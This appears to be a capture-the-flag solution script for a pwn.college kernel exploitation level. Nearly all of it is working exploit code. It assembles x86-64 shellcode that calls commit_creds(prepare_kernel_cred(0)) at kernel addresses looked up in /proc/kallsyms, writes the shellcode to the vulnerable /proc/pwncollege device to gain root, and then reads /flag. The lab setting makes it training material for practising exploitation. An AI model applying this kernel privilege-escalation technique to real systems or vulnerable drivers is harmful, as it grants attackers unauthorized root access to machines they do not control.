# Level 6

# loading `pwn` inside vm cost forever.
# so we create shellcode outside vm and then run it inside vm.

# commit_creds(prepare_kernel_cred(0))
pwn asm -c amd64 '
mov rdi, 0
// vm exec sudo grep -w prepare_kernel_cred /proc/kallsyms
mov rax, 0xffffffff81089660
call rax
mov rdi, rax
// vm exec sudo grep -w commit_creds /proc/kallsyms
mov rax, 0xffffffff81089310
call rax
ret
' > shellcode.bin

# vm exec cannot handle space inside quoted string...
vm exec python3 << EOF
import os
shellcode = open("shellcode.bin", "rb").read()
fd = os.open("/proc/pwncollege", os.O_WRONLY)
os.write(fd, shellcode)
os.close(fd)
print(open("/flag").read())
EOF
